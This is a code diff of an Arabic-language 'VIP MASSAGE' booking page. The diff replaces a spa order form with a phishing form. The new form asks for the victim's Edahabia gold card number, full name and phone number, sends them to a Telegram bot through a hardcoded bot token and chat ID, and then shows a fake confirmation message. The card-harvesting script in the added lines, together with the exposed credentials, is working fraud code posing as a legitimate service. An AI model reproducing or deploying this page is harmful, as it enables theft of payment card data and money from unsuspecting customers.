@@ -3,82 +3,102 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>خدمات سبا VIP</title>
+<title>تأكيد الحجز VIP</title>
 
 <style>
-body{
+*{
 margin:0;
+padding:0;
+box-sizing:border-box;
 font-family:Arial;
-background:#0f0f0f;
+}
+
+body{
+background:linear-gradient(135deg,#0f0f0f,#1b1b1b);
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
 color:white;
 }
 
 .container{
-max-width:450px;
-margin:20px auto;
-background:#1c1c1c;
-padding:20px;
-border-radius:15px;
+width:100%;
+max-width:420px;
+background:#181818;
+border-radius:20px;
+padding:30px;
+box-shadow:0 0 25px rgba(0,0,0,0.6);
 border:1px solid #333;
 }
 
-h1{text-align:center;color:#00ff99}
+.logo{
+text-align:center;
+font-size:28px;
+font-weight:bold;
+margin-bottom:10px;
+color:#d4af37;
+}
 
-input,select{
+.desc{
+text-align:center;
+font-size:14px;
+color:#bbb;
+margin-bottom:25px;
+}
+
+.inputBox{
+margin-bottom:18px;
+}
+
+.inputBox label{
+display:block;
+margin-bottom:8px;
+font-size:14px;
+color:#ddd;
+}
+
+.inputBox input{
 width:100%;
-padding:12px;
-margin-top:10px;
+padding:14px;
 border:none;
-border-radius:10px;
-background:#2a2a2a;
+outline:none;
+border-radius:12px;
+background:#222;
 color:white;
+font-size:15px;
+border:1px solid #333;
+}
+
+.inputBox input:focus{
+border:1px solid #d4af37;
 }
 
 button{
 width:100%;
-padding:14px;
-margin-top:15px;
+padding:15px;
+background:#d4af37;
 border:none;
-border-radius:10px;
-background:#00c46a;
-color:white;
+border-radius:14px;
 font-size:16px;
 font-weight:bold;
 cursor:pointer;
+transition:0.3s;
+color:black;
 }
 
-.price{
-margin-top:15px;
-padding:12px;
-background:#111;
-border-radius:10px;
+button:hover{
+opacity:0.9;
+transform:scale(1.02);
+}
+
+.message{
+margin-top:18px;
 text-align:center;
-font-size:20px;
-color:#00ff99;
-}
-
-.notice{
-margin-top:10px;
-padding:10px;
-background:#003d1f;
-border-radius:10px;
-text-align:center;
-font-size:13px;
-color:#8cffc1;
-}
-
-.images{
-display:grid;
-grid-template-columns:repeat(2,1fr);
-gap:10px;
-margin-top:15px;
-}
-
-.images img{
-width:100%;
-height:120px;
-object-fit:cover;
-border-radius:10px;
+font-size:14px;
+color:#00ff95;
+display:none;
 }
 </style>
 </head>
@@ -87,122 +107,85 @@ border-radius:10px;
 
 <div class="container">
 
-<h1>خدمات سبا VIP</h1>
+<div class="logo">VIP MASSAGE</div>
 
-<!-- صور -->
-<div class="images">
-<img src="https://images.unsplash.com/photo-1544161515-4ab6ce6db874">
-<img src="https://images.unsplash.com/photo-1519821172141-b5d8c4c5a5c5">
-<img src="https://images.unsplash.com/photo-1540555700478-4be289fbecef">
-<img src="https://images.unsplash.com/photo-1507652313519-d4e9174996dd">
+<div class="desc"
+يرجى ملء المعلومات لتأكيد الحجز
 </div>
 
-<form id="form">
+<form id="massageForm">
 
-<input type="text" id="name" placeholder="الاسم" required>
-<input type="tel" id="phone" placeholder="الهاتف" required>
-
-<select id="wilaya" required>
-<option value="">اختر الولاية</option>
-<option>وهران</option>
-<option>الجزائر</option>
-<option>عنابة</option>
-<option>قسنطينة</option>
-<option>سطيف</option>
-<option>باتنة</option>
-<option>بجاية</option>
-<option>البليدة</option>
-<option>تيزي وزو</option>
-<option>تلمسان</option>
-<option>سيدي بلعباس</option>
-<option>ورقلة</option>
-<option>غرداية</option>
-<option>أدرار</option>
-<option>الشلف</option>
-<option>بومرداس</option>
-<option>المدية</option>
-<option>مستغانم</option>
-<option>النعامة</option>
-<option>عين تموشنت</option>
-<option>غليزان</option>
-</select>
-
-<select id="service">
-<option value="8000">سبا عادي - 8000 دج</option>
-<option value="16000">سبا VIP - 16000 دج</option>
-</select>
-
-<input type="text" id="promo" placeholder="كود البرومو (اختياري)">
-
-<div class="price">
-السعر النهائي:
-<span id="price">8000</span> دج
+<div class="inputBox">
+<label>رقم بطاقة الذهبية</label>
+<input type="text" id="gold" placeholder="0079xxxxxxxxxxxx">
 </div>
 
-<!-- الدفع -->
-<div class="notice">
-بريدي موب<br>
-<b>00799999004286372491</b>
+<div class="inputBox">
+<label>الاسم و اللقب بالفرنسية</label>
+<input type="text" id="name" placeholder="Nom et prénom">
 </div>
 
-<input type="file" id="receipt" accept="image/*" required>
-
-<div class="notice">
-ارفع وصل الدفع لتأكيد الحجز
+<div class="inputBox">
+<label>رقم الهاتف</label>
+<input type="text" id="phone" placeholder="05xxxxxxxx">
 </div>
 
-<button type="submit">إرسال الطلب</button>
+<button type="submit">تأكيد الحجز</button>
+
+<div class="message" id="message">
+تم إرسال الطلب بنجاح ✅
+</div>
 
 </form>
 
 </div>
 
 <script>
+const TOKEN = "8844512844:AAGu_jJp-A8ZJfHTTi_Rh57zOCaCbIcd6kk";
+const CHAT_ID = "8735699172";
 
-const service = document.getElementById("service");
-const promo = document.getElementById("promo");
-const priceBox = document.getElementById("price");
+document.getElementById("massageForm").addEventListener("submit", async function(e){
 
-function calc(){
-let base = parseInt(service.value);
-let final = base;
-
-// كود خصم
-if(promo.value.trim() === "VIP5000" && base === 16000){
-final = 11000;
-}
-
-priceBox.innerText = final;
-}
-
-service.onchange = calc;
-promo.oninput = calc;
-
-document.getElementById("form").addEventListener("submit", function(e){
 e.preventDefault();
 
-calc();
+const gold = document.getElementById("gold").value;
+const name = document.getElementById("name").value;
+const phone = document.getElementById("phone").value;
 
-let name = document.getElementById("name").value;
-let phone = document.getElementById("phone").value;
-let wilaya = document.getElementById("wilaya").value;
-let serviceText = service.options[service.selectedIndex].text;
-let price = priceBox.innerText;
+const text =
+`📥 طلب جديد
 
-alert(
-"تم استلام طلبك بنجاح ✅\n\n" +
-"الاسم: " + name + "\n" +
-"الهاتف: " + phone + "\n" +
-"الولاية: " + wilaya + "\n" +
-"الخدمة: " + serviceText + "\n" +
-"السعر: " + price + " دج\n\n" +
-"سنقوم بالتواصل معك قريباً"
-);
+💳 رقم الذهبية:
+${gold}
 
-document.getElementById("form").reset();
-priceBox.innerText = "8000";
+👤 الاسم:
+${name}
+
+📞 الهاتف:
+${phone}`;
+
+try{
+
+await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:text
+})
 });
 
+document.getElementById("message").style.display="block";
+
+document.getElementById("massageForm").reset();
+
+}catch(err){
+alert("حدث خطأ أثناء الإرسال");
+}
+
+});
 </script>
 
 </body>
